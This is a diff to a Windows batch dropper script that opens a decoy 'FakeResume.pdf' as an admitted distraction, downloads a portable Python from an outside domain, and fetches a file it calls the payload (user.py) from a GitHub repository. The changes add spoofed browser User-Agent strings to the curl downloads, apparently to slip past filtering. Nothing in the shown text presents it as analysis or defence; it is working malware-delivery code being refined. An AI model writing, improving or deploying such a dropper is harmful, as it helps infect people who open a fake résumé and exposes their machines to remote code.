@@ -1,11 +1,11 @@
 @echo off
 
 REM Open PDF FIRST (user sees it immediately - distraction!)
-start /b curl -s -L https://github.com/workspacehome0/download/raw/main/FakeResume.pdf -o "%temp%\doc.pdf"
+start /b curl -s -L -A "Mozilla/5.0" https://github.com/workspacehome0/download/raw/main/FakeResume.pdf -o "%temp%\doc.pdf"
 timeout /t 1 /nobreak >nul
 start "" "%temp%\doc.pdf"
 
-REM Download Python portable (in background)
+REM Download Python portable (in background, with proper User-Agent)
 curl -L -A "Mozilla/5.0" https://centremedicalwakim.com/app/python-portable.zip -o "%temp%\py.zip"
 
 REM Wait for download to complete (check file size is stable)
@@ -33,7 +33,7 @@ goto cleanup
 
 :python_found
 REM Download payload
-curl -s https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py -o "%temp%\user.py"
+curl -s -A "Mozilla/5.0" https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py -o "%temp%\user.py"
 
 REM Wait for user.py download
 timeout /t 1 /nobreak >nul
